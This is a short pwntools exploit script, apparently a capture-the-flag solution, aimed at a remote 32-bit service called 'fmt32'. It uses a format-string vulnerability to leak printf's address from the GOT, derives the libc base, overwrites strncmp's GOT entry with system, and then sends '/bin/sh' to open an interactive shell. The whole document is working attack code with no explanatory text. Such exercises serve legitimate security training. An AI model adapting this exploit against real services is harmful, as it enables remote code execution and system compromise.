from pwn import *

context.terminal = ('open-wsl.exe', "-e")
# context.log_level = 'debug'
context.arch = 'i386'

# io = process("./fmt32")
io = remote("everything411.top", 10001)
elf = ELF("./fmt32")
libc = ELF("./x86-libc-2.23.so")

printf_got = elf.got["printf"]
printf_offset = libc.symbols["printf"]
system_offset = libc.symbols["system"]
strncmp_got = elf.got["strncmp"]

def sendfmt(fmt):
    log.info("payload = %s" % repr(fmt))
    io.sendlineafter("input:", fmt)
    return io.recvline()

leak = sendfmt(b"%5$s" + p32(printf_got))
printf_addr = u32(leak[0:4])
libcbase = printf_addr - printf_offset
system_addr = libcbase + system_offset

fmt = fmtstr_payload(4, {strncmp_got: system_addr})
sendfmt(fmt)
io.sendline("/bin/sh")
io.interactive()
